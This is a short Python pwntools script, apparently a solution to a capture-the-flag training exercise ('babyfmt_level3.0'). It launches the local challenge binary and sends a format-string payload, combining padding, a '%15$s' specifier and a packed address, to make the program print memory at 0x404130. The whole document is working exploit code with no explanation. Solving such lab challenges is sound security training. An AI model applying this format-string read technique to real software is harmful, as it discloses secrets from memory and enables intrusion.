from pwn import *

context.arch = 'amd64'


p = process("/challenge/babyfmt_level3.0")
payload = b'A'*5 + b"%15$s" + b"AAA" + p64(0x404130)
print(payload)
p.send(payload)
print(p.recvall().decode())